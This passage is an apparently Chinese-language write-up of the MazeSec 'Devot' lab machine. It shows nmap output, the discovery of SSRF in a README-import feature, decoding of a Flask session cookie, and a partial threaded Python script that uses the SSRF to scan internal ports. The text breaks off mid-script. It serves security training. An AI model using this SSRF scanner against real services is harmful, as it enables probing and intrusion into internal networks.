@@ -1,0 +1,1464 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Devot 靶机来源：MazeSec（https://maze-sec.com/） 作者: Sublarge 难度: Easy 系统: Linux 信息收集 端口探测 使用 Nmap 进行端口扫描。 1 2 3 4">
+<title>MazeSec Devot</title>
+
+<link rel='canonical' href='https://Sp1ke-sec.github.io/p/mazesec-devot/'>
+
+<link rel="stylesheet" href="/scss/style.min.3dc2b87862416cdfa498393fe10f71a7856c63450472efbab1e94150643be501.css"><meta property='og:title' content="MazeSec Devot">
+<meta property='og:description' content="Devot 靶机来源：MazeSec（https://maze-sec.com/） 作者: Sublarge 难度: Easy 系统: Linux 信息收集 端口探测 使用 Nmap 进行端口扫描。 1 2 3 4">
+<meta property='og:url' content='https://Sp1ke-sec.github.io/p/mazesec-devot/'>
+<meta property='og:site_name' content='Sp1ke-sec 安全博客'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-11-18T15:04:34&#43;08:00'/><meta property='article:modified_time' content='2026-11-18T15:04:34&#43;08:00'/>
+<meta name="twitter:title" content="MazeSec Devot">
+<meta name="twitter:description" content="Devot 靶机来源：MazeSec（https://maze-sec.com/） 作者: Sublarge 难度: Easy 系统: Linux 信息收集 端口探测 使用 Nmap 进行端口扫描。 1 2 3 4">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu1489495842607495246.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🚭</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Sp1ke-sec 安全博客</a></h1>
+            <h2 class="site-description">这里是 Sp1ke-sec</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Sp1ke-sec'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#信息收集">信息收集</a>
+      <ol>
+        <li><a href="#端口探测">端口探测</a></li>
+      </ol>
+    </li>
+    <li><a href="#立足点">立足点</a>
+      <ol>
+        <li><a href="#ssrf">SSRF</a></li>
+        <li><a href="#ssti">SSTI</a></li>
+      </ol>
+    </li>
+    <li><a href="#提权">提权</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/mazesec/" style="background-color: #2a9d8f; color: #fff;">
+                MazeSec
+            </a>
+        
+            <a href="/categories/easy/" >
+                Easy
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/mazesec-devot/">MazeSec Devot</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2026-11-18</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 7 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="devot">Devot
+</h1><p>靶机来源：MazeSec（https://maze-sec.com/）</p>
+<p>作者: Sublarge</p>
+<p>难度: Easy</p>
+<p>系统: Linux</p>
+<h2 id="信息收集">信息收集
+</h2><h3 id="端口探测">端口探测
+</h3><p>使用 Nmap 进行端口扫描。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/MazeSec/Devot<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nmap -Pn -p- T4 192.168.1.7                                     
+</span></span><span class="line"><span class="cl">Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-11-16 07:13 +0000
+</span></span><span class="line"><span class="cl">Failed to resolve <span class="s2">&#34;T4&#34;</span>.
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.1.7 <span class="o">(</span>192.168.1.7<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.00066s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65533</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
+</span></span><span class="line"><span class="cl">22/tcp open  ssh
+</span></span><span class="line"><span class="cl">80/tcp open  http
+</span></span><span class="line"><span class="cl">MAC Address: 08:00:27:61:97:4A <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 10.22 seconds
+</span></span><span class="line"><span class="cl">   
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/MazeSec/Devot<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nmap -Pn -sV -sC -p22,80  192.168.1.7
+</span></span><span class="line"><span class="cl">Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-11-16 07:14 +0000
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.1.7 <span class="o">(</span>192.168.1.7<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.0016s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 10.5 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    nginx
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Preview environments <span class="se">\x</span>C2<span class="se">\x</span>B7 DEVOT
+</span></span><span class="line"><span class="cl">MAC Address: 08:00:27:61:97:4A <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 6.78 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>PORT</th>
+<th>SERVICE</th>
+<th>NOTES</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22</td>
+<td>ssh</td>
+<td>OpenSSH 10.5</td>
+</tr>
+<tr>
+<td>80</td>
+<td>http</td>
+<td>nginx</td>
+</tr>
+</tbody>
+</table></div>
+<h2 id="立足点">立足点
+</h2><h3 id="ssrf">SSRF
+</h3><p>访问 80 端口。</p>
+<p><img src="/p/mazesec-devot/assets/image-20261116201131478.png"
+	width="2558"
+	height="1256"
+	srcset="/p/mazesec-devot/assets/image-20261116201131478_hu5839373481080623770.png 480w, /p/mazesec-devot/assets/image-20261116201131478_hu16762066356274989053.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261116201131478"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="203"
+		data-flex-basis="488px"
+	
+></p>
+<p>并注册一个账户，<code>spike@qq.com:12345678</code>。</p>
+<p>在 <code>/dashboard</code>，存在新建项目的功能点，指定 <code>NAME/URL/BRANCH</code> 后即可创建项目。</p>
+<p><img src="/p/mazesec-devot/assets/image-20261116201316430.png"
+	width="1730"
+	height="915"
+	srcset="/p/mazesec-devot/assets/image-20261116201316430_hu8082302907638408363.png 480w, /p/mazesec-devot/assets/image-20261116201316430_hu17399850874167067184.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261116201316430"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="189"
+		data-flex-basis="453px"
+	
+></p>
+<p>此处已存在一个项目 <code>hello-devot</code>。</p>
+<p>点击该项目，会跳转到 <code>/projects/1</code>。存在 <code>Import README</code> 和 <code>Run preview build</code> 两个功能点。</p>
+<p><img src="/p/mazesec-devot/assets/image-20261116201428511.png"
+	width="1730"
+	height="1240"
+	srcset="/p/mazesec-devot/assets/image-20261116201428511_hu13048380262242929574.png 480w, /p/mazesec-devot/assets/image-20261116201428511_hu7545296801193359164.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261116201428511"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="139"
+		data-flex-basis="334px"
+	
+></p>
+<p>可见 <code>Import README</code> 会接收我们输入的 URL 并进行处理，这样的功能点很可能存在 SSRF。</p>
+<p>我喜欢通过输入 <code>http://www.baidu.com</code> 验证是否可以发起 HTTP 请求，结果确实回显了对应的 html 源码，说明确实存在 SSRF。</p>
+<p>SSRF 的一大作用是探测内网服务，输入 <code>http://127.0.0.1</code> 发现确实可以探测内网，此处没有任何过滤。</p>
+<p>抓包分析整个请求。</p>
+<p>发现会先 <code>POST /projects/1/import</code>，请求体为 <code>url=http://127.0.0.1</code>。而响应是一个 <code>302</code> 重定向，并且附带一个 <code>Set-Cookie</code>，字段值为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">session</span><span class="o">=</span>eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkltcG9ydGVkIFJFQURNRSBmcm9tIGh0dHA6Ly8xMjcuMC4wLjEgKEhUVFAgMjAwLCAxOTY3IGJ5dGVzKS4iXX1dLCJ1aWQiOjF9.avr0oQ.aphtItXuscwb8h2B-Z8kw2NqUOI<span class="p">;</span> HttpOnly<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> <span class="nv">SameSite</span><span class="o">=</span>Lax
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个 <code>session</code> 是 Flask Session 的格式，内容集中在第一部分，是 <code>base64</code> 编码的，解码可知：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/MazeSec/Devot<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# <span class="nb">echo</span> <span class="s2">&#34;eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkltcG9ydGVkIFJFQURNRSBmcm9tIGh0dHA6Ly8xMjcuMC4wLjEgKEhUVFAgMjAwLCAxOTY3IGJ5dGVzKS4iXX1dLCJ1aWQiOjF9&#34;</span> <span class="p">|</span> base64 -d
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;_flashes&#34;</span>:<span class="o">[{</span><span class="s2">&#34; t&#34;</span>:<span class="o">[</span><span class="s2">&#34;message&#34;</span>,<span class="s2">&#34;Imported README from http://127.0.0.1 (HTTP 200, 1967 bytes).&#34;</span><span class="o">]}]</span>,<span class="s2">&#34;uid&#34;</span>:1<span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后会带着这个 <code>session</code> 再发起 <code>GET /projects/1</code>，这时候才会回显目标的源码。</p>
+<p>写脚本进行端口探测：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">queue</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">BASE</span> <span class="o">=</span> <span class="s2">&#34;http://192.168.1.7&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">INIT_SESSION</span> <span class="o">=</span> <span class="s2">&#34;eyJ1aWQiOjF9.avr0oQ.cfFyv_q1nqFAC_LuLLsix_x6TSo&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">CLOSED_PAT</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;Import failed: &amp;lt;urlopen error \[Errno 111\] Connection refused&amp;gt;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">FLASH_PAT</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;class=&#34;flash message&#34;&gt;(.*?)&lt;/div&gt;&#39;</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">S</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">probe</span><span class="p">(</span><span class="n">target_url</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 第一步 POST import，初始干净cookie</span>
+</span></span><span class="line"><span class="cl">    <span class="n">headers1</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;Cookie&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;session=</span><span class="si">{</span><span class="n">INIT_SESSION</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;url&#34;</span><span class="p">:</span> <span class="n">target_url</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r1</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">BASE</span><span class="si">}</span><span class="s2">/projects/1/import&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers1</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">8</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 取出POST返回的带flash的session</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sess_with_flash</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;session=([^;]+)&#34;</span><span class="p">,</span> <span class="n">r1</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;Set-Cookie&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">))</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 第二步 GET 页面渲染flash，这一步之后session自动重置回uid版本</span>
+</span></span><span class="line"><span class="cl">    <span class="n">headers2</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;Cookie&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;session=</span><span class="si">{</span><span class="n">sess_with_flash</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r2</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">BASE</span><span class="si">}</span><span class="s2">/projects/1&#34;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers2</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">8</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">flash_match</span> <span class="o">=</span> <span class="n">FLASH_PAT</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">r2</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">flash_match</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;NO_FLASH&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">flash_msg</span> <span class="o">=</span> <span class="n">flash_match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">flash_msg</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">worker</span><span class="p">(</span><span class="n">q</span><span class="p">,</span> <span class="n">out</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">url</span> <span class="o">=</span> <span class="n">q</span><span class="o">.</span><span class="n">get_nowait</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="n">queue</span><span class="o">.</span><span class="n">Empty</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span>
+</span></span><span class="line"><span class="cl">        <span class="n">msg</span> <span class="o">=</span> <span class="n">probe</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">CLOSED_PAT</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">msg</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s2">  =&gt; </span><span class="si">{</span><span class="n">msg</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">out</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">url</span><span class="p">,</span> <span class="n">msg</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">scan</span><span class="p">(</span><span class="n">port_range</span><span class="p">,</span> <span class="n">threads</span><span class="o">=</span><span class="mi">10</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">q</span> <span class="o">=</span> <span class="n">queue</span><span class="o">.</span><span class="n">Queue</span><span class="p">()</span>
